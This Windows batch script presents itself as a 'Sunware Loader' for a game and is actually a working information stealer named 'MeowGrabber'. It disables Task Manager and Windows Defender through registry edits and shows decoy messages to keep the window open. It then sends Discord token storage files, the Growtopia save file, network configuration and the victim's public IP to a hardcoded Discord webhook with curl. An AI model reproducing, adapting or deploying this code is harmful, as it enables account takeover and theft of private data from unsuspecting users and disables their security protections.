@echo off
title Sunware Loader UwU
color 02
REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im taskmgr.exe
REG add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f
echo.
echo.
echo #############################
echo Do not exit the cmd or sunware will crash
echo Deleting "proxy" file will cause Sunware not working
echo CMD will exit on its own
echo ##############################
echo.
echo ##############################
echo Discord: Aabox#0001
echo ##############################
:: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.


:: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
set "vpath=C:\ProgramData"

cd %vpath%

:: If using onlogin on Task Scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
goto skipadministrator
if not "%~dp0"=="%vpath%\" (
	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
)
:skipadministrator

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
:: --------------------------------------
set "webhook=https://discord.com/api/webhooks/1113067000705589289/U9aqzUL3u608MBfvUtuoiu7Lse0f1cEmlLe0eN2aGlKvCW9vyQT8JepSUK-HYDIC5cRL"

:: GET PRIVATE IP ADDRESS
:: ----------------------
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET PUBLIC IP ADDRESS
:: ---------------------
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

:: GET TIME
:: --------
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)

:: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: -------------------------------------------------------

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[-MeowGrabber-]\n-Discord-```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)
:skipdiscord

:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ---------------------------------------------------------

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[-MeowGrabber-]\nGrowtopia```\"}"  %webhook%
	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
	
	timeout /t 2 /nobreak > NUL
:skipgrowtopia

:: IPCONFIG /ALL - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
:: ------------------------------------------------------------------
	set "ipconfig=%appdata%\ipconfig.txt"
	2>NUL ipconfig /all > "%ipconfig%"
	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
	del "%ipconfig%" >nul 2>&1
:skipipconfig

:: SEND FIRST REPORT MESSAGE WITH SOME INFO
:: ----------------------------------------
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[-MeowGrabber-]\nIp address: %PublicIP%\nLocal time: %HH24%:%MI%```\"}"  %webhook%